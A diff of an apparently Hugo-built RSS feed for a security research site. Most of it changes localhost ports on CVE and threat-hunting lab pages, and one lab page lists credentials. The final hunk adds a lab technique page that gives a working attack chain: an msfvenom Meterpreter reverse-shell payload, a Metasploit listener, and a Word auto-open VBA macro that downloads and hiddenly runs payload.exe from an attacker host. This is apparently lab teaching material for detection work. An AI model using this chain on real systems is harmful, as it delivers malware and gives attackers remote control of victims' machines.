@@ -1,13 +1,13 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>RTFM – Prasanna V Balaji</title>
-    <link>http://localhost:40231/authors/prasanna-v-balaji/</link>
+    <link>http://localhost:1313/authors/prasanna-v-balaji/</link>
     <description>Recent content in Prasanna V Balaji on RTFM</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-US</language>
     <lastBuildDate>Sat, 21 Nov 2026 00:00:00 +0000</lastBuildDate>
     
-	  <atom:link href="http://localhost:40231/authors/prasanna-v-balaji/index.xml" rel="self" type="application/rss+xml" />
+	  <atom:link href="http://localhost:1313/authors/prasanna-v-balaji/index.xml" rel="self" type="application/rss+xml" />
     
     
       
@@ -17,10 +17,10 @@
     
     <item>
       <title>CVE-2023-24390</title>
-      <link>http://localhost:40231/docs/07_research/10-cve-2023-24390/</link>
+      <link>http://localhost:1313/docs/07_research/10-cve-2023-24390/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/10-cve-2023-24390/</guid>
+      <guid>http://localhost:1313/docs/07_research/10-cve-2023-24390/</guid>
       <description>
         
         
@@ -150,10 +150,10 @@
     
     <item>
       <title>CVE-2023-25452</title>
-      <link>http://localhost:40231/docs/07_research/14-cve-2023-25452/</link>
+      <link>http://localhost:1313/docs/07_research/14-cve-2023-25452/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/14-cve-2023-25452/</guid>
+      <guid>http://localhost:1313/docs/07_research/14-cve-2023-25452/</guid>
       <description>
         
         
@@ -283,10 +283,10 @@
     
     <item>
       <title>CVE-2023-25476</title>
-      <link>http://localhost:40231/docs/07_research/04-cve-2023-25476/</link>
+      <link>http://localhost:1313/docs/07_research/04-cve-2023-25476/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/04-cve-2023-25476/</guid>
+      <guid>http://localhost:1313/docs/07_research/04-cve-2023-25476/</guid>
       <description>
         
         
@@ -416,10 +416,10 @@
     
     <item>
       <title>CVE-2023-25974</title>
-      <link>http://localhost:40231/docs/07_research/16-cve-2023-25974/</link>
+      <link>http://localhost:1313/docs/07_research/16-cve-2023-25974/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/16-cve-2023-25974/</guid>
+      <guid>http://localhost:1313/docs/07_research/16-cve-2023-25974/</guid>
       <description>
         
         
@@ -549,10 +549,10 @@
     
     <item>
       <title>CVE-2023-26516</title>
-      <link>http://localhost:40231/docs/07_research/12-cve-2023-26516/</link>
+      <link>http://localhost:1313/docs/07_research/12-cve-2023-26516/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/12-cve-2023-26516/</guid>
+      <guid>http://localhost:1313/docs/07_research/12-cve-2023-26516/</guid>
       <description>
         
         
@@ -682,10 +682,10 @@
     
     <item>
       <title>CVE-2023-26522</title>
-      <link>http://localhost:40231/docs/07_research/15-cve-2023-26522/</link>
+      <link>http://localhost:1313/docs/07_research/15-cve-2023-26522/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/15-cve-2023-26522/</guid>
+      <guid>http://localhost:1313/docs/07_research/15-cve-2023-26522/</guid>
       <description>
         
         
@@ -813,10 +813,10 @@
     
     <item>
       <title>CVE-2023-26527</title>
-      <link>http://localhost:40231/docs/07_research/17-cve-2023-26527/</link>
+      <link>http://localhost:1313/docs/07_research/17-cve-2023-26527/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/17-cve-2023-26527/</guid>
+      <guid>http://localhost:1313/docs/07_research/17-cve-2023-26527/</guid>
       <description>
         
         
@@ -946,10 +946,10 @@
     
     <item>
       <title>CVE-2023-26541</title>
-      <link>http://localhost:40231/docs/07_research/18-cve-2023-26541/</link>
+      <link>http://localhost:1313/docs/07_research/18-cve-2023-26541/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/18-cve-2023-26541/</guid>
+      <guid>http://localhost:1313/docs/07_research/18-cve-2023-26541/</guid>
       <description>
         
         
@@ -1079,10 +1079,10 @@
     
     <item>
       <title>CVE-2023-28168</title>
-      <link>http://localhost:40231/docs/07_research/13-cve-2023-28168/</link>
+      <link>http://localhost:1313/docs/07_research/13-cve-2023-28168/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/13-cve-2023-28168/</guid>
+      <guid>http://localhost:1313/docs/07_research/13-cve-2023-28168/</guid>
       <description>
         
         
@@ -1210,10 +1210,10 @@
     
     <item>
       <title>CVE-2023-30477</title>
-      <link>http://localhost:40231/docs/07_research/12-cve-2023-30477/</link>
+      <link>http://localhost:1313/docs/07_research/12-cve-2023-30477/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/12-cve-2023-30477/</guid>
+      <guid>http://localhost:1313/docs/07_research/12-cve-2023-30477/</guid>
       <description>
         
         
@@ -1343,10 +1343,10 @@
     
     <item>
       <title>CVE-2023-30754</title>
-      <link>http://localhost:40231/docs/07_research/11-cve-2023-30754/</link>
+      <link>http://localhost:1313/docs/07_research/11-cve-2023-30754/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/11-cve-2023-30754/</guid>
+      <guid>http://localhost:1313/docs/07_research/11-cve-2023-30754/</guid>
       <description>
         
         
@@ -1476,10 +1476,10 @@
     
     <item>
       <title>CVE-2023-33208</title>
-      <link>http://localhost:40231/docs/07_research/08-cve-2023-33208/</link>
+      <link>http://localhost:1313/docs/07_research/08-cve-2023-33208/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/08-cve-2023-33208/</guid>
+      <guid>http://localhost:1313/docs/07_research/08-cve-2023-33208/</guid>
       <description>
         
         
@@ -1609,10 +1609,10 @@
     
     <item>
       <title>CVE-2023-37992</title>
-      <link>http://localhost:40231/docs/07_research/07-cve-2023-37992/</link>
+      <link>http://localhost:1313/docs/07_research/07-cve-2023-37992/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/07-cve-2023-37992/</guid>
+      <guid>http://localhost:1313/docs/07_research/07-cve-2023-37992/</guid>
       <description>
         
         
@@ -1742,10 +1742,10 @@
     
     <item>
       <title>CVE-2023-40328</title>
-      <link>http://localhost:40231/docs/07_research/06-cve-2023-40328/</link>
+      <link>http://localhost:1313/docs/07_research/06-cve-2023-40328/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/06-cve-2023-40328/</guid>
+      <guid>http://localhost:1313/docs/07_research/06-cve-2023-40328/</guid>
       <description>
         
         
@@ -1875,10 +1875,10 @@
     
     <item>
       <title>CVE-2023-41661</title>
-      <link>http://localhost:40231/docs/07_research/05-cve-2023-41661/</link>
+      <link>http://localhost:1313/docs/07_research/05-cve-2023-41661/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/05-cve-2023-41661/</guid>
+      <guid>http://localhost:1313/docs/07_research/05-cve-2023-41661/</guid>
       <description>
         
         
@@ -2008,10 +2008,10 @@
     
     <item>
       <title>CVE-2023-45276</title>
-      <link>http://localhost:40231/docs/07_research/03-cve-2023-45276/</link>
+      <link>http://localhost:1313/docs/07_research/03-cve-2023-45276/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/03-cve-2023-45276/</guid>
+      <guid>http://localhost:1313/docs/07_research/03-cve-2023-45276/</guid>
       <description>
         
         
@@ -2141,10 +2141,10 @@
     
     <item>
       <title>CVE-2023-45641</title>
-      <link>http://localhost:40231/docs/07_research/02-cve-2023-45641/</link>
+      <link>http://localhost:1313/docs/07_research/02-cve-2023-45641/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/02-cve-2023-45641/</guid>
+      <guid>http://localhost:1313/docs/07_research/02-cve-2023-45641/</guid>
       <description>
         
         
@@ -2274,10 +2274,10 @@
     
     <item>
       <title>CVE-2023-45642</title>
-      <link>http://localhost:40231/docs/07_research/01-cve-2023-45642/</link>
+      <link>http://localhost:1313/docs/07_research/01-cve-2023-45642/</link>
       <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/07_research/01-cve-2023-45642/</guid>
+      <guid>http://localhost:1313/docs/07_research/01-cve-2023-45642/</guid>
       <description>
         
         
@@ -2407,10 +2407,10 @@
     
     <item>
       <title>Lab Development</title>
-      <link>http://localhost:40231/docs/05_detection/5.1_labs/02-lab-development/</link>
+      <link>http://localhost:1313/docs/05_detection/5.1_labs/02-lab-development/</link>
       <pubDate>Mon, 02 Nov 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/05_detection/5.1_labs/02-lab-development/</guid>
+      <guid>http://localhost:1313/docs/05_detection/5.1_labs/02-lab-development/</guid>
       <description>
         
         
@@ -2471,32 +2471,32 @@
 &lt;ul&gt;
 &lt;li&gt;&lt;a
     href=&#34;https://ubuntu.com/download&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://ubuntu.com/download&lt;/a&gt;
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102130536.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102130536.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Create a new VM in VMWare
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134231.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134231.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Choose the Ubuntu Server ISO file and proceed to next.
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134335.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134335.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Once setup, install the Ubuntu Server from the Live ISO file.
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134539.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134539.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;SInce it&amp;rsquo;s a VM for a Lab environment, the server settings are pretty much straight forward.
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134705.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134705.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Set up the &lt;code&gt;username&lt;/code&gt; credentials and it starts installing.
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134839.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102134839.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Once the installation is completed. login to the Ubuntu Server
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102141258.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102141258.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Next we will set up the Ubuntu server with the nexessary tools.&lt;/p&gt;
@@ -2555,7 +2555,7 @@
 &lt;/div&gt;
 &lt;ul&gt;
 &lt;li&gt;Once done, our directory structure should look the below;
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102145540.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102145540.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h4&gt;02 Setting up SIEM&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;02-setting-up-siem&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#02-setting-up-siem&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
@@ -2799,21 +2799,21 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;ul&gt;
 &lt;li&gt;Next login to the Splunk instance using the credentials &lt;code&gt;hunter:hunter123&lt;/code&gt;
-&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102152122.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102152122.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102152140.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102152140.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;h4&gt;02 Target Architecture&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;02-target-architecture&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#02-target-architecture&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/05_detection/5.1_labs/assets/Pasted_image_20261102130458.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+    &lt;a href=&#34;#02-target-architecture&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102130458.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 
       </description>
     </item>
     
     <item>
-      <title>Workshop Overview</title>
-      <link>http://localhost:40231/docs/05_detection/5.1_labs/01-workshop-intro/</link>
-      <pubDate>Mon, 02 Nov 2026 00:00:00 +0000</pubDate>
+      <title>[02] VBS Macro Payload Execution</title>
+      <link>http://localhost:1313/docs/03_techniques/02-vbs-macro-payload-execution/</link>
+      <pubDate>Mon, 26 Oct 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/05_detection/5.1_labs/01-workshop-intro/</guid>
+      <guid>http://localhost:1313/docs/03_techniques/02-vbs-macro-payload-execution/</guid>
       <description>
         
         
@@ -2845,74 +2845,242 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 
   
     &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
-    &lt;time style=&#34;font-style: italic;&#34;&gt;November 2, 2026&lt;/time&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;October 26, 2026&lt;/time&gt;
   
 &lt;/div&gt;
-&lt;h5&gt;Topic: Hypothesis Driven Threat Hunting&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;topic-hypothesis-driven-threat-hunting&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#topic-hypothesis-driven-threat-hunting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;Duration: 4.5 Hours&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; This Threat Hunting workshop is designed to provide participants with practical experience in identifying, investigating and analysing suspicious activities using a SIEM platform.&lt;/p&gt;
-&lt;p&gt;Participants will work within a preconfigured environment containing artificially generated security logs that simulate realistic cyber incidents.&lt;/p&gt;
-&lt;p&gt;Through guided and independent investigation exercises, participants will learn the following:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Develop threat hunting hypotheses&lt;/li&gt;
-&lt;li&gt;Analyse security events&lt;/li&gt;
-&lt;li&gt;Correlate logs from multiple sources&lt;/li&gt;
-&lt;li&gt;Identify IOCs and IOAs&lt;/li&gt;
-&lt;li&gt;Reconstruct incident timelines.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;The workshop will follow a scenario-based approach, where participants act as Threat Hunters investigating a suspected security incident within a simulated enterprise environment using a Threat Intelligence Report.&lt;/p&gt;
-&lt;h5&gt;Participant requirements&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;participant-requirements&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#participant-requirements&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;table&gt;
-	&lt;thead&gt;
-			&lt;tr&gt;
-					&lt;th&gt;Requirement&lt;/th&gt;
-					&lt;th&gt;Local VM&lt;/th&gt;
-					&lt;th&gt;Hosted lab (VM)&lt;/th&gt;
-			&lt;/tr&gt;
-	&lt;/thead&gt;
-	&lt;tbody&gt;
-			&lt;tr&gt;
-					&lt;td&gt;Laptop&lt;/td&gt;
-					&lt;td&gt;Required&lt;/td&gt;
-					&lt;td&gt;Required&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;RAM&lt;/td&gt;
-					&lt;td&gt;8 GB minimum recommended&lt;/td&gt;
-					&lt;td&gt;4–8 GB recommended&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;VirtualBox / VMware&lt;/td&gt;
-					&lt;td&gt;Required&lt;/td&gt;
-					&lt;td&gt;Not required&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;Web browser&lt;/td&gt;
-					&lt;td&gt;Required&lt;/td&gt;
-					&lt;td&gt;Required&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;Internet&lt;/td&gt;
-					&lt;td&gt;Download/setup&lt;/td&gt;
-					&lt;td&gt;Required&lt;/td&gt;
-			&lt;/tr&gt;
-			&lt;tr&gt;
-					&lt;td&gt;Splunk installation&lt;/td&gt;
-					&lt;td&gt;Preinstalled&lt;/td&gt;
-					&lt;td&gt;Preinstalled&lt;/td&gt;
-			&lt;/tr&gt;
-	&lt;/tbody&gt;
-&lt;/table&gt;
+&lt;h4&gt;STEP 1: Set up client machine&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-1-set-up-client-machine&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-1-set-up-client-machine&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;In the attacker machine generate a payload as shown below&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.10.10 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -o payload.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#### SET UP PYTHON SERVER TO HOST THE PAYLOAD&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python3 -m http.server&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Now start &lt;code&gt;MSF CONSOLE&lt;/code&gt; and set up the listener&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msfdb run
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msf &amp;gt; use exploi/multi/handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msf &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msf &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LHOST 192.168.10.10
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msf &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ msf &amp;gt; run &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4&gt;STEP 2: Malicious VBS Script&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-2-malicious-vbs-script&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-2-malicious-vbs-script&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;In MS Word, embed the malicious VBS script by choosing &lt;code&gt;View&lt;/code&gt; and click on &lt;code&gt;Macros&lt;/code&gt;
+&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261026152438.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;Next Create a macro called &lt;code&gt;MyMacro&lt;/code&gt;
+&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261026152554.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload.
+&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261026152635.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = &amp;#34;powershell (New-Object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.10.10/payload.exe&amp;#39;, &amp;#39;payload.exe&amp;#39;)&amp;#34;
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveDocument.Path &amp;amp; &amp;#34;\&amp;#34; &amp;amp; &amp;#34;payload.exe&amp;#34;
+    Wait (2)
+    Shell exePath, vbHide
+
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now &amp;gt;= DateAdd(&amp;#34;s&amp;#34;, n, t)
+End Sub&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
